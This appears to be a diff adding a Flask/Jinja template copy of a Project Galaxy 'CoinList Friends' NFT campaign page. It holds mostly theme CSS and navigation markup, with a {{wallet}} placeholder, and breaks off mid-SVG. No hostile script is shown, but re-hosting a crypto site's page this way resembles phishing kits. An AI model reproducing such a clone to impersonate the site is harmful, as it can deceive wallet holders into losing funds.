@@ -1,0 +1,904 @@
+<html lang="en"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="SHORTCUT ICON" href="/faviconV2.ico"><link href="{{ url_for('static', filename='css/app.c7096103.css') }}" rel="preload" as="style">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+
+
+
+<link href="{{ url_for('static', filename='css/chunk-vendors.ea7a61df.css') }}" rel="preload" as="style"><link href="{{ url_for('static', filename='css/chunk-vendors.ea7a61df.css') }}" rel="stylesheet"><link href="{{ url_for('static', filename='css/app.c7096103.css') }}" rel="stylesheet"><style type="text/css" id="vuetify-theme-stylesheet">:root {
+  --v-anchor-base: #4754ff;
+  --v-primary-base: #4754ff;
+  --v-primary-lighten5: #eed8ff;
+  --v-primary-lighten4: #cfbcff;
+  --v-primary-lighten3: #afa1ff;
+  --v-primary-lighten2: #8f86ff;
+  --v-primary-lighten1: #6d6dff;
+  --v-primary-darken1: #013ce2;
+  --v-primary-darken2: #0026c5;
+  --v-primary-darken3: #0011a9;
+  --v-primary-darken4: #00028d;
+  --v-secondary-base: #15171c;
+  --v-secondary-lighten5: #888b91;
+  --v-secondary-lighten4: #6f7178;
+  --v-secondary-lighten3: #57595f;
+  --v-secondary-lighten2: #3f4147;
+  --v-secondary-lighten1: #292b31;
+  --v-secondary-darken1: #000001;
+  --v-secondary-darken2: #000000;
+  --v-secondary-darken3: #000000;
+  --v-secondary-darken4: #000000;
+  --v-accent-base: #0f1114;
+  --v-accent-lighten1: #090b0d;
+  --v-accent-lighten2: #040405;
+  --v-accent-lighten3: #15171c;
+  --v-error-base: #ff5252;
+  --v-error-lighten5: #ffe4d5;
+  --v-error-lighten4: #ffc6b9;
+  --v-error-lighten3: #ffa99e;
+  --v-error-lighten2: #ff8c84;
+  --v-error-lighten1: #ff6f6a;
+  --v-error-darken1: #df323b;
+  --v-error-darken2: #bf0025;
+  --v-error-darken3: #9f0010;
+  --v-error-darken4: #800000;
+  --v-info-base: #ffffff;
+  --v-info-lighten1: #a8aeba;
+  --v-info-lighten2: #a8aeba;
+  --v-info-lighten3: #535862;
+  --v-info-lighten4: #343840;
+  --v-info-lighten5: #292d33;
+  --v-success-base: #4caf50;
+  --v-success-lighten5: #dcffd6;
+  --v-success-lighten4: #beffba;
+  --v-success-lighten3: #a2ff9e;
+  --v-success-lighten2: #85e783;
+  --v-success-lighten1: #69cb69;
+  --v-success-darken1: #2d9437;
+  --v-success-darken2: #00791e;
+  --v-success-darken3: #006000;
+  --v-success-darken4: #004700;
+  --v-warning-base: #ffc107;
+  --v-warning-lighten5: #ffffae;
+  --v-warning-lighten4: #ffff91;
+  --v-warning-lighten3: #ffff74;
+  --v-warning-lighten2: #fff956;
+  --v-warning-lighten1: #ffdd37;
+  --v-warning-darken1: #e0a600;
+  --v-warning-darken2: #c18c00;
+  --v-warning-darken3: #a27300;
+  --v-warning-darken4: #855a00;
+  --v-disabled-base: #414450;
+  --v-disabled-lighten1: #9699a7;
+  --v-border-base: #212a4b;
+  --v-border-lighten1: #afb4c7;
+  --v-border-lighten2: #384a91;
+  --v-highlight-base: #4754ff;
+  --v-primary2-base: #4754ff;
+  --v-primary2-lighten1: #5765ff;
+  --v-primary2-lighten2: #477dff;
+  --v-primary2-lighten3: #5789ff;
+  --v-background-base: #0f1114;
+  --v-background-darken1: #090b0d;
+  --v-background-darken2: #040405;
+  --v-background-lighten1: #15171c;
+  --v-background-lighten2: #1b1e24;
+  --v-background-lighten3: #21252b;
+  --v-text-base: #ffffff;
+  --v-text-darken1: #a8aeba;
+  --v-text-darken2: #535862;
+  --v-text-darken3: #343840;
+  --v-text-darken4: #292d33;
+  --v-textLink-base: #477dff;
+  --v-textLink-lighten1: #5789ff;
+  --v-divider-base: #0f1114;
+  --v-divider-lighten1: #21252b;
+}
+
+.v-application a { color: var(--v-anchor-base); }
+.v-application .primary {
+  background-color: var(--v-primary-base) !important;
+  border-color: var(--v-primary-base) !important;
+}
+.v-application .primary--text {
+  color: var(--v-primary-base) !important;
+  caret-color: var(--v-primary-base) !important;
+}
+.v-application .primary.lighten-5 {
+  background-color: var(--v-primary-lighten5) !important;
+  border-color: var(--v-primary-lighten5) !important;
+}
+.v-application .primary--text.text--lighten-5 {
+  color: var(--v-primary-lighten5) !important;
+  caret-color: var(--v-primary-lighten5) !important;
+}
+.v-application .primary.lighten-4 {
+  background-color: var(--v-primary-lighten4) !important;
+  border-color: var(--v-primary-lighten4) !important;
+}
+.v-application .primary--text.text--lighten-4 {
+  color: var(--v-primary-lighten4) !important;
+  caret-color: var(--v-primary-lighten4) !important;
+}
+.v-application .primary.lighten-3 {
+  background-color: var(--v-primary-lighten3) !important;
+  border-color: var(--v-primary-lighten3) !important;
+}
+.v-application .primary--text.text--lighten-3 {
+  color: var(--v-primary-lighten3) !important;
+  caret-color: var(--v-primary-lighten3) !important;
+}
+.v-application .primary.lighten-2 {
+  background-color: var(--v-primary-lighten2) !important;
+  border-color: var(--v-primary-lighten2) !important;
+}
+.v-application .primary--text.text--lighten-2 {
+  color: var(--v-primary-lighten2) !important;
+  caret-color: var(--v-primary-lighten2) !important;
+}
+.v-application .primary.lighten-1 {
+  background-color: var(--v-primary-lighten1) !important;
+  border-color: var(--v-primary-lighten1) !important;
+}
+.v-application .primary--text.text--lighten-1 {
+  color: var(--v-primary-lighten1) !important;
+  caret-color: var(--v-primary-lighten1) !important;
+}
+.v-application .primary.darken-1 {
+  background-color: var(--v-primary-darken1) !important;
+  border-color: var(--v-primary-darken1) !important;
+}
+.v-application .primary--text.text--darken-1 {
+  color: var(--v-primary-darken1) !important;
+  caret-color: var(--v-primary-darken1) !important;
+}
+.v-application .primary.darken-2 {
+  background-color: var(--v-primary-darken2) !important;
+  border-color: var(--v-primary-darken2) !important;
+}
+.v-application .primary--text.text--darken-2 {
+  color: var(--v-primary-darken2) !important;
+  caret-color: var(--v-primary-darken2) !important;
+}
+.v-application .primary.darken-3 {
+  background-color: var(--v-primary-darken3) !important;
+  border-color: var(--v-primary-darken3) !important;
+}
+.v-application .primary--text.text--darken-3 {
+  color: var(--v-primary-darken3) !important;
+  caret-color: var(--v-primary-darken3) !important;
+}
+.v-application .primary.darken-4 {
+  background-color: var(--v-primary-darken4) !important;
+  border-color: var(--v-primary-darken4) !important;
+}
+.v-application .primary--text.text--darken-4 {
+  color: var(--v-primary-darken4) !important;
+  caret-color: var(--v-primary-darken4) !important;
+}
+.v-application .secondary {
+  background-color: var(--v-secondary-base) !important;
+  border-color: var(--v-secondary-base) !important;
+}
+.v-application .secondary--text {
+  color: var(--v-secondary-base) !important;
+  caret-color: var(--v-secondary-base) !important;
+}
+.v-application .secondary.lighten-5 {
+  background-color: var(--v-secondary-lighten5) !important;
+  border-color: var(--v-secondary-lighten5) !important;
+}
+.v-application .secondary--text.text--lighten-5 {
+  color: var(--v-secondary-lighten5) !important;
+  caret-color: var(--v-secondary-lighten5) !important;
+}
+.v-application .secondary.lighten-4 {
+  background-color: var(--v-secondary-lighten4) !important;
+  border-color: var(--v-secondary-lighten4) !important;
+}
+.v-application .secondary--text.text--lighten-4 {
+  color: var(--v-secondary-lighten4) !important;
+  caret-color: var(--v-secondary-lighten4) !important;
+}
+.v-application .secondary.lighten-3 {
+  background-color: var(--v-secondary-lighten3) !important;
+  border-color: var(--v-secondary-lighten3) !important;
+}
+.v-application .secondary--text.text--lighten-3 {
+  color: var(--v-secondary-lighten3) !important;
+  caret-color: var(--v-secondary-lighten3) !important;
+}
+.v-application .secondary.lighten-2 {
+  background-color: var(--v-secondary-lighten2) !important;
+  border-color: var(--v-secondary-lighten2) !important;
+}
+.v-application .secondary--text.text--lighten-2 {
+  color: var(--v-secondary-lighten2) !important;
+  caret-color: var(--v-secondary-lighten2) !important;
+}
+.v-application .secondary.lighten-1 {
+  background-color: var(--v-secondary-lighten1) !important;
+  border-color: var(--v-secondary-lighten1) !important;
+}
+.v-application .secondary--text.text--lighten-1 {
+  color: var(--v-secondary-lighten1) !important;
+  caret-color: var(--v-secondary-lighten1) !important;
+}
+.v-application .secondary.darken-1 {
+  background-color: var(--v-secondary-darken1) !important;
+  border-color: var(--v-secondary-darken1) !important;
+}
+.v-application .secondary--text.text--darken-1 {
+  color: var(--v-secondary-darken1) !important;
+  caret-color: var(--v-secondary-darken1) !important;
+}
+.v-application .secondary.darken-2 {
+  background-color: var(--v-secondary-darken2) !important;
+  border-color: var(--v-secondary-darken2) !important;
+}
+.v-application .secondary--text.text--darken-2 {
+  color: var(--v-secondary-darken2) !important;
+  caret-color: var(--v-secondary-darken2) !important;
+}
+.v-application .secondary.darken-3 {
+  background-color: var(--v-secondary-darken3) !important;
+  border-color: var(--v-secondary-darken3) !important;
+}
+.v-application .secondary--text.text--darken-3 {
+  color: var(--v-secondary-darken3) !important;
+  caret-color: var(--v-secondary-darken3) !important;
+}
+.v-application .secondary.darken-4 {
+  background-color: var(--v-secondary-darken4) !important;
+  border-color: var(--v-secondary-darken4) !important;
+}
+.v-application .secondary--text.text--darken-4 {
+  color: var(--v-secondary-darken4) !important;
+  caret-color: var(--v-secondary-darken4) !important;
+}
+.v-application .accent {
+  background-color: var(--v-accent-base) !important;
+  border-color: var(--v-accent-base) !important;
+}
+.v-application .accent--text {
+  color: var(--v-accent-base) !important;
+  caret-color: var(--v-accent-base) !important;
+}
+.v-application .accent.lighten-1 {
+  background-color: var(--v-accent-lighten1) !important;
+  border-color: var(--v-accent-lighten1) !important;
+}
+.v-application .accent--text.text--lighten-1 {
+  color: var(--v-accent-lighten1) !important;
+  caret-color: var(--v-accent-lighten1) !important;
+}
+.v-application .accent.lighten-2 {
+  background-color: var(--v-accent-lighten2) !important;
+  border-color: var(--v-accent-lighten2) !important;
+}
+.v-application .accent--text.text--lighten-2 {
+  color: var(--v-accent-lighten2) !important;
+  caret-color: var(--v-accent-lighten2) !important;
+}
+.v-application .accent.lighten-3 {
+  background-color: var(--v-accent-lighten3) !important;
+  border-color: var(--v-accent-lighten3) !important;
+}
+.v-application .accent--text.text--lighten-3 {
+  color: var(--v-accent-lighten3) !important;
+  caret-color: var(--v-accent-lighten3) !important;
+}
+.v-application .error {
+  background-color: var(--v-error-base) !important;
+  border-color: var(--v-error-base) !important;
+}
+.v-application .error--text {
+  color: var(--v-error-base) !important;
+  caret-color: var(--v-error-base) !important;
+}
+.v-application .error.lighten-5 {
+  background-color: var(--v-error-lighten5) !important;
+  border-color: var(--v-error-lighten5) !important;
+}
+.v-application .error--text.text--lighten-5 {
+  color: var(--v-error-lighten5) !important;
+  caret-color: var(--v-error-lighten5) !important;
+}
+.v-application .error.lighten-4 {
+  background-color: var(--v-error-lighten4) !important;
+  border-color: var(--v-error-lighten4) !important;
+}
+.v-application .error--text.text--lighten-4 {
+  color: var(--v-error-lighten4) !important;
+  caret-color: var(--v-error-lighten4) !important;
+}
+.v-application .error.lighten-3 {
+  background-color: var(--v-error-lighten3) !important;
+  border-color: var(--v-error-lighten3) !important;
+}
+.v-application .error--text.text--lighten-3 {
+  color: var(--v-error-lighten3) !important;
+  caret-color: var(--v-error-lighten3) !important;
+}
+.v-application .error.lighten-2 {
+  background-color: var(--v-error-lighten2) !important;
+  border-color: var(--v-error-lighten2) !important;
+}
+.v-application .error--text.text--lighten-2 {
+  color: var(--v-error-lighten2) !important;
+  caret-color: var(--v-error-lighten2) !important;
+}
+.v-application .error.lighten-1 {
+  background-color: var(--v-error-lighten1) !important;
+  border-color: var(--v-error-lighten1) !important;
+}
+.v-application .error--text.text--lighten-1 {
+  color: var(--v-error-lighten1) !important;
+  caret-color: var(--v-error-lighten1) !important;
+}
+.v-application .error.darken-1 {
+  background-color: var(--v-error-darken1) !important;
+  border-color: var(--v-error-darken1) !important;
+}
+.v-application .error--text.text--darken-1 {
+  color: var(--v-error-darken1) !important;
+  caret-color: var(--v-error-darken1) !important;
+}
+.v-application .error.darken-2 {
+  background-color: var(--v-error-darken2) !important;
+  border-color: var(--v-error-darken2) !important;
+}
+.v-application .error--text.text--darken-2 {
+  color: var(--v-error-darken2) !important;
+  caret-color: var(--v-error-darken2) !important;
+}
+.v-application .error.darken-3 {
+  background-color: var(--v-error-darken3) !important;
+  border-color: var(--v-error-darken3) !important;
+}
+.v-application .error--text.text--darken-3 {
+  color: var(--v-error-darken3) !important;
+  caret-color: var(--v-error-darken3) !important;
+}
+.v-application .error.darken-4 {
+  background-color: var(--v-error-darken4) !important;
+  border-color: var(--v-error-darken4) !important;
+}
+.v-application .error--text.text--darken-4 {
+  color: var(--v-error-darken4) !important;
+  caret-color: var(--v-error-darken4) !important;
+}
+.v-application .info {
+  background-color: var(--v-info-base) !important;
+  border-color: var(--v-info-base) !important;
+}
+.v-application .info--text {
+  color: var(--v-info-base) !important;
+  caret-color: var(--v-info-base) !important;
+}
+.v-application .info.lighten-1 {
+  background-color: var(--v-info-lighten1) !important;
+  border-color: var(--v-info-lighten1) !important;
+}
+.v-application .info--text.text--lighten-1 {
+  color: var(--v-info-lighten1) !important;
+  caret-color: var(--v-info-lighten1) !important;
+}
+.v-application .info.lighten-2 {
+  background-color: var(--v-info-lighten2) !important;
+  border-color: var(--v-info-lighten2) !important;
+}
+.v-application .info--text.text--lighten-2 {
+  color: var(--v-info-lighten2) !important;
+  caret-color: var(--v-info-lighten2) !important;
+}
+.v-application .info.lighten-3 {
+  background-color: var(--v-info-lighten3) !important;
+  border-color: var(--v-info-lighten3) !important;
+}
+.v-application .info--text.text--lighten-3 {
+  color: var(--v-info-lighten3) !important;
+  caret-color: var(--v-info-lighten3) !important;
+}
+.v-application .info.lighten-4 {
+  background-color: var(--v-info-lighten4) !important;
+  border-color: var(--v-info-lighten4) !important;
+}
+.v-application .info--text.text--lighten-4 {
+  color: var(--v-info-lighten4) !important;
+  caret-color: var(--v-info-lighten4) !important;
+}
+.v-application .info.lighten-5 {
+  background-color: var(--v-info-lighten5) !important;
+  border-color: var(--v-info-lighten5) !important;
+}
+.v-application .info--text.text--lighten-5 {
+  color: var(--v-info-lighten5) !important;
+  caret-color: var(--v-info-lighten5) !important;
+}
+.v-application .success {
+  background-color: var(--v-success-base) !important;
+  border-color: var(--v-success-base) !important;
+}
+.v-application .success--text {
+  color: var(--v-success-base) !important;
+  caret-color: var(--v-success-base) !important;
+}
+.v-application .success.lighten-5 {
+  background-color: var(--v-success-lighten5) !important;
+  border-color: var(--v-success-lighten5) !important;
+}
+.v-application .success--text.text--lighten-5 {
+  color: var(--v-success-lighten5) !important;
+  caret-color: var(--v-success-lighten5) !important;
+}
+.v-application .success.lighten-4 {
+  background-color: var(--v-success-lighten4) !important;
+  border-color: var(--v-success-lighten4) !important;
+}
+.v-application .success--text.text--lighten-4 {
+  color: var(--v-success-lighten4) !important;
+  caret-color: var(--v-success-lighten4) !important;
+}
+.v-application .success.lighten-3 {
+  background-color: var(--v-success-lighten3) !important;
+  border-color: var(--v-success-lighten3) !important;
+}
+.v-application .success--text.text--lighten-3 {
+  color: var(--v-success-lighten3) !important;
+  caret-color: var(--v-success-lighten3) !important;
+}
+.v-application .success.lighten-2 {
+  background-color: var(--v-success-lighten2) !important;
+  border-color: var(--v-success-lighten2) !important;
+}
+.v-application .success--text.text--lighten-2 {
+  color: var(--v-success-lighten2) !important;
+  caret-color: var(--v-success-lighten2) !important;
+}
+.v-application .success.lighten-1 {
+  background-color: var(--v-success-lighten1) !important;
+  border-color: var(--v-success-lighten1) !important;
+}
+.v-application .success--text.text--lighten-1 {
+  color: var(--v-success-lighten1) !important;
+  caret-color: var(--v-success-lighten1) !important;
+}
+.v-application .success.darken-1 {
+  background-color: var(--v-success-darken1) !important;
+  border-color: var(--v-success-darken1) !important;
+}
+.v-application .success--text.text--darken-1 {
+  color: var(--v-success-darken1) !important;
+  caret-color: var(--v-success-darken1) !important;
+}
+.v-application .success.darken-2 {
+  background-color: var(--v-success-darken2) !important;
+  border-color: var(--v-success-darken2) !important;
+}
+.v-application .success--text.text--darken-2 {
+  color: var(--v-success-darken2) !important;
+  caret-color: var(--v-success-darken2) !important;
+}
+.v-application .success.darken-3 {
+  background-color: var(--v-success-darken3) !important;
+  border-color: var(--v-success-darken3) !important;
+}
+.v-application .success--text.text--darken-3 {
+  color: var(--v-success-darken3) !important;
+  caret-color: var(--v-success-darken3) !important;
+}
+.v-application .success.darken-4 {
+  background-color: var(--v-success-darken4) !important;
+  border-color: var(--v-success-darken4) !important;
+}
+.v-application .success--text.text--darken-4 {
+  color: var(--v-success-darken4) !important;
+  caret-color: var(--v-success-darken4) !important;
+}
+.v-application .warning {
+  background-color: var(--v-warning-base) !important;
+  border-color: var(--v-warning-base) !important;
+}
+.v-application .warning--text {
+  color: var(--v-warning-base) !important;
+  caret-color: var(--v-warning-base) !important;
+}
+.v-application .warning.lighten-5 {
+  background-color: var(--v-warning-lighten5) !important;
+  border-color: var(--v-warning-lighten5) !important;
+}
+.v-application .warning--text.text--lighten-5 {
+  color: var(--v-warning-lighten5) !important;
+  caret-color: var(--v-warning-lighten5) !important;
+}
+.v-application .warning.lighten-4 {
+  background-color: var(--v-warning-lighten4) !important;
+  border-color: var(--v-warning-lighten4) !important;
+}
+.v-application .warning--text.text--lighten-4 {
+  color: var(--v-warning-lighten4) !important;
+  caret-color: var(--v-warning-lighten4) !important;
+}
+.v-application .warning.lighten-3 {
+  background-color: var(--v-warning-lighten3) !important;
+  border-color: var(--v-warning-lighten3) !important;
+}
+.v-application .warning--text.text--lighten-3 {
+  color: var(--v-warning-lighten3) !important;
+  caret-color: var(--v-warning-lighten3) !important;
+}
+.v-application .warning.lighten-2 {
+  background-color: var(--v-warning-lighten2) !important;
+  border-color: var(--v-warning-lighten2) !important;
+}
+.v-application .warning--text.text--lighten-2 {
+  color: var(--v-warning-lighten2) !important;
+  caret-color: var(--v-warning-lighten2) !important;
+}
+.v-application .warning.lighten-1 {
+  background-color: var(--v-warning-lighten1) !important;
+  border-color: var(--v-warning-lighten1) !important;
+}
+.v-application .warning--text.text--lighten-1 {
+  color: var(--v-warning-lighten1) !important;
+  caret-color: var(--v-warning-lighten1) !important;
+}
+.v-application .warning.darken-1 {
+  background-color: var(--v-warning-darken1) !important;
+  border-color: var(--v-warning-darken1) !important;
+}
+.v-application .warning--text.text--darken-1 {
+  color: var(--v-warning-darken1) !important;
+  caret-color: var(--v-warning-darken1) !important;
+}
+.v-application .warning.darken-2 {
+  background-color: var(--v-warning-darken2) !important;
+  border-color: var(--v-warning-darken2) !important;
+}
+.v-application .warning--text.text--darken-2 {
+  color: var(--v-warning-darken2) !important;
+  caret-color: var(--v-warning-darken2) !important;
+}
+.v-application .warning.darken-3 {
+  background-color: var(--v-warning-darken3) !important;
+  border-color: var(--v-warning-darken3) !important;
+}
+.v-application .warning--text.text--darken-3 {
+  color: var(--v-warning-darken3) !important;
+  caret-color: var(--v-warning-darken3) !important;
+}
+.v-application .warning.darken-4 {
+  background-color: var(--v-warning-darken4) !important;
+  border-color: var(--v-warning-darken4) !important;
+}
+.v-application .warning--text.text--darken-4 {
+  color: var(--v-warning-darken4) !important;
+  caret-color: var(--v-warning-darken4) !important;
+}
+.v-application .disabled {
+  background-color: var(--v-disabled-base) !important;
+  border-color: var(--v-disabled-base) !important;
+}
+.v-application .disabled--text {
+  color: var(--v-disabled-base) !important;
+  caret-color: var(--v-disabled-base) !important;
+}
+.v-application .disabled.lighten-1 {
+  background-color: var(--v-disabled-lighten1) !important;
+  border-color: var(--v-disabled-lighten1) !important;
+}
+.v-application .disabled--text.text--lighten-1 {
+  color: var(--v-disabled-lighten1) !important;
+  caret-color: var(--v-disabled-lighten1) !important;
+}
+.v-application .border {
+  background-color: var(--v-border-base) !important;
+  border-color: var(--v-border-base) !important;
+}
+.v-application .border--text {
+  color: var(--v-border-base) !important;
+  caret-color: var(--v-border-base) !important;
+}
+.v-application .border.lighten-1 {
+  background-color: var(--v-border-lighten1) !important;
+  border-color: var(--v-border-lighten1) !important;
+}
+.v-application .border--text.text--lighten-1 {
+  color: var(--v-border-lighten1) !important;
+  caret-color: var(--v-border-lighten1) !important;
+}
+.v-application .border.lighten-2 {
+  background-color: var(--v-border-lighten2) !important;
+  border-color: var(--v-border-lighten2) !important;
+}
+.v-application .border--text.text--lighten-2 {
+  color: var(--v-border-lighten2) !important;
+  caret-color: var(--v-border-lighten2) !important;
+}
+.v-application .highlight {
+  background-color: var(--v-highlight-base) !important;
+  border-color: var(--v-highlight-base) !important;
+}
+.v-application .highlight--text {
+  color: var(--v-highlight-base) !important;
+  caret-color: var(--v-highlight-base) !important;
+}
+.v-application .primary2 {
+  background-color: var(--v-primary2-base) !important;
+  border-color: var(--v-primary2-base) !important;
+}
+.v-application .primary2--text {
+  color: var(--v-primary2-base) !important;
+  caret-color: var(--v-primary2-base) !important;
+}
+.v-application .primary2.lighten-1 {
+  background-color: var(--v-primary2-lighten1) !important;
+  border-color: var(--v-primary2-lighten1) !important;
+}
+.v-application .primary2--text.text--lighten-1 {
+  color: var(--v-primary2-lighten1) !important;
+  caret-color: var(--v-primary2-lighten1) !important;
+}
+.v-application .primary2.lighten-2 {
+  background-color: var(--v-primary2-lighten2) !important;
+  border-color: var(--v-primary2-lighten2) !important;
+}
+.v-application .primary2--text.text--lighten-2 {
+  color: var(--v-primary2-lighten2) !important;
+  caret-color: var(--v-primary2-lighten2) !important;
+}
+.v-application .primary2.lighten-3 {
+  background-color: var(--v-primary2-lighten3) !important;
+  border-color: var(--v-primary2-lighten3) !important;
+}
+.v-application .primary2--text.text--lighten-3 {
+  color: var(--v-primary2-lighten3) !important;
+  caret-color: var(--v-primary2-lighten3) !important;
+}
+.v-application .background {
+  background-color: var(--v-background-base) !important;
+  border-color: var(--v-background-base) !important;
+}
+.v-application .background--text {
+  color: var(--v-background-base) !important;
+  caret-color: var(--v-background-base) !important;
+}
+.v-application .background.darken-1 {
+  background-color: var(--v-background-darken1) !important;
+  border-color: var(--v-background-darken1) !important;
+}
+.v-application .background--text.text--darken-1 {
+  color: var(--v-background-darken1) !important;
+  caret-color: var(--v-background-darken1) !important;
+}
+.v-application .background.darken-2 {
+  background-color: var(--v-background-darken2) !important;
+  border-color: var(--v-background-darken2) !important;
+}
+.v-application .background--text.text--darken-2 {
+  color: var(--v-background-darken2) !important;
+  caret-color: var(--v-background-darken2) !important;
+}
+.v-application .background.lighten-1 {
+  background-color: var(--v-background-lighten1) !important;
+  border-color: var(--v-background-lighten1) !important;
+}
+.v-application .background--text.text--lighten-1 {
+  color: var(--v-background-lighten1) !important;
+  caret-color: var(--v-background-lighten1) !important;
+}
+.v-application .background.lighten-2 {
+  background-color: var(--v-background-lighten2) !important;
+  border-color: var(--v-background-lighten2) !important;
+}
+.v-application .background--text.text--lighten-2 {
+  color: var(--v-background-lighten2) !important;
+  caret-color: var(--v-background-lighten2) !important;
+}
+.v-application .background.lighten-3 {
+  background-color: var(--v-background-lighten3) !important;
+  border-color: var(--v-background-lighten3) !important;
+}
+.v-application .background--text.text--lighten-3 {
+  color: var(--v-background-lighten3) !important;
+  caret-color: var(--v-background-lighten3) !important;
+}
+.v-application .text {
+  background-color: var(--v-text-base) !important;
+  border-color: var(--v-text-base) !important;
+}
+.v-application .text--text {
+  color: var(--v-text-base) !important;
+  caret-color: var(--v-text-base) !important;
+}
+.v-application .text.darken-1 {
+  background-color: var(--v-text-darken1) !important;
+  border-color: var(--v-text-darken1) !important;
+}
+.v-application .text--text.text--darken-1 {
+  color: var(--v-text-darken1) !important;
+  caret-color: var(--v-text-darken1) !important;
+}
+.v-application .text.darken-2 {
+  background-color: var(--v-text-darken2) !important;
+  border-color: var(--v-text-darken2) !important;
+}
+.v-application .text--text.text--darken-2 {
+  color: var(--v-text-darken2) !important;
+  caret-color: var(--v-text-darken2) !important;
+}
+.v-application .text.darken-3 {
+  background-color: var(--v-text-darken3) !important;
+  border-color: var(--v-text-darken3) !important;
+}
+.v-application .text--text.text--darken-3 {
+  color: var(--v-text-darken3) !important;
+  caret-color: var(--v-text-darken3) !important;
+}
+.v-application .text.darken-4 {
+  background-color: var(--v-text-darken4) !important;
+  border-color: var(--v-text-darken4) !important;
+}
+.v-application .text--text.text--darken-4 {
+  color: var(--v-text-darken4) !important;
+  caret-color: var(--v-text-darken4) !important;
+}
+.v-application .textLink {
+  background-color: var(--v-textLink-base) !important;
+  border-color: var(--v-textLink-base) !important;
+}
+.v-application .textLink--text {
+  color: var(--v-textLink-base) !important;
+  caret-color: var(--v-textLink-base) !important;
+}
+.v-application .textLink.lighten-1 {
+  background-color: var(--v-textLink-lighten1) !important;
+  border-color: var(--v-textLink-lighten1) !important;
+}
+.v-application .textLink--text.text--lighten-1 {
+  color: var(--v-textLink-lighten1) !important;
+  caret-color: var(--v-textLink-lighten1) !important;
+}
+.v-application .divider {
+  background-color: var(--v-divider-base) !important;
+  border-color: var(--v-divider-base) !important;
+}
+.v-application .divider--text {
+  color: var(--v-divider-base) !important;
+  caret-color: var(--v-divider-base) !important;
+}
+.v-application .divider.lighten-1 {
+  background-color: var(--v-divider-lighten1) !important;
+  border-color: var(--v-divider-lighten1) !important;
+}
+.v-application .divider--text.text--lighten-1 {
+  color: var(--v-divider-lighten1) !important;
+  caret-color: var(--v-divider-lighten1) !important;
+}</style>
+
+<title>CoinList - CoinList Friends by CoinList | Project Galaxy</title><meta data-vue-meta="1" property="fb:app_id" content="261269599153250"><link rel="stylesheet" type="text/css" href="https://galaxy.eco/css/chunk-1e9f2708.64c9721d.css"><meta data-vue-meta="1" name="twitter:card" content="summary"><link rel="stylesheet" type="text/css" href="https://galaxy.eco/css/chunk-35faccc2.b526203c.css">
+<meta data-vue-meta="1" name="og:url" content="https://galaxy.eco/coinlist/campaign/GCAQYUUoVG"><meta data-vue-meta="1" name="og:title" content="CoinList - CoinList Friends by CoinList | Project Galaxy"><meta data-vue-meta="1" name="og:image" content="https://d257b89266utxb.cloudfront.net/galaxy/images/coinlist/1640663040225545114.png"><meta data-vue-meta="1" name="og:description" content="Join CoinList - CoinList Friends NFT campaigns created by CoinList on Project Galaxy. 222 FiatWorks NFTs will be allocated for friends, "><meta data-vue-meta="1" name="image" content="https://d257b89266utxb.cloudfront.net/galaxy/images/coinlist/1640663040225545114.png"><meta data-vue-meta="1" name="description" content="Join CoinList - CoinList Friends NFT campaigns created by CoinList on Project Galaxy. 222 FiatWorks NFTs will be allocated for friends, "><meta data-vue-meta="1" name="twitter:title" content="CoinList - CoinList Friends by CoinList | Project Galaxy"><meta data-vue-meta="1" name="twitter:image" content="https://d257b89266utxb.cloudfront.net/galaxy/images/coinlist/1640663040225545114.png"><meta data-vue-meta="1" name="twitter:description" content="Join CoinList - CoinList Friends NFT campaigns created by CoinList on Project Galaxy. 222 FiatWorks NFTs will be allocated for friends, "></head><body ><div id="app" style="height: auto;"><div data-app="true" class="v-application app v-application--is-ltr theme--dark" id="app"><div class="v-application--wrap"><div data-v-26bb5490="" class="top-bar"><div data-v-26bb5490="" id="topNavbar" class="top-navbar"><div data-v-26bb5490="" class="position-relative height-100 width-100"><div data-v-26bb5490="" class="top-navbar-bg" style="opacity: 1;"></div><div data-v-26bb5490="" class="top-navbar-content"><div data-v-26bb5490="" class="left"><div data-v-26bb5490="" class="flex-align-center"><a data-v-26bb5490="" href="/" class="logo flex-all-center router-link-active"><img data-v-26bb5490="" height="32px" src="https://galaxy.eco/img/new-logo.edf4ae1e.svg" class="marginr-3 ml-7 ml-md-12"></a><div data-v-26bb5490="" class="height-100 d-md-flex d-none"><a data-v-26bb5490="" class="marginl-8 clickable my-nft-btn text-16-regular" style="color: #f8f8fb;" href="https://galaxy.eco/campaigns"> Explore </a><a data-v-26bb5490="" style="color: #f8f8fb;" class="marginl-8 clickable my-nft-btn text-16-regular" href="https://galaxy.eco/spaces"> Spaces </a><a data-v-26bb5490="" style="color: #f8f8fb;" class="marginl-8 clickable my-nft-btn text-16-regular" href="https://galaxy.eco/mynfts/list"> My NFTs </a><a data-v-26bb5490="" style="color: #f8f8fb;" class="marginl-8 clickable my-nft-btn text-16-regular" href="https://galaxy.eco/galaxyid/{{wallet}}"> Galaxy ID </a><a data-v-26bb5490="" style="color: #f8f8fb;" class="marginl-8 clickable my-nft-btn text-16-regular" href="https://projectgalaxy.medium.com/"> Blog </a><a data-v-26bb5490="" style="color: #f8f8fb;" class="marginl-8 clickable my-nft-btn text-16-regular" href="https://docs.galaxy.eco/"> Docs </a></div></div></div><div data-v-26bb5490="" class="right flex-align-center"><div data-v-26bb5490="" class="flex-align-center d-none d-md-flex mr-7 mr-md-12"><div data-v-4fceba52="" data-v-26bb5490="" class="flex-all-center wallet-btn"><div data-v-4fceba52=""><div data-v-4fceba52=""><div data-v-4fceba52="" class="chain-btn flex-all-center marginr-4 clickable"><span data-v-4fceba52="" class="text-14-regular text-overline-ellipsis-1">Ethereum</span></div></div></div><div data-v-4fceba52="" role="dialog" class="v-dialog__container"><!----></div></div><!----><div data-v-26bb5490="" class="flex-align-center"><img data-v-f6c849d8="" data-v-26bb5490="" src="https://source.boringavatars.com/marble/120/{{wallet}}" class="setting-avatar"></div></div><div data-v-26bb5490="" class="flex-align-center marginr-6 d-md-none"><div data-v-26bb5490="" class="flex-align-center"><img data-v-f6c849d8="" data-v-26bb5490="" src="https://source.boringavatars.com/marble/120/{{wallet}}" class="setting-avatar"></div><button data-v-7981bb3b="" data-v-26bb5490="" class="menu marginl-4"><svg data-v-7981bb3b="" viewBox="0 0 64 48"><path data-v-7981bb3b="" d="M19,15 L45,15 C70,15 58,-2 49.0177126,7 L19,37"></path><path data-v-7981bb3b="" d="M19,24 L45,24 C61.2371586,24 57,49 41,33 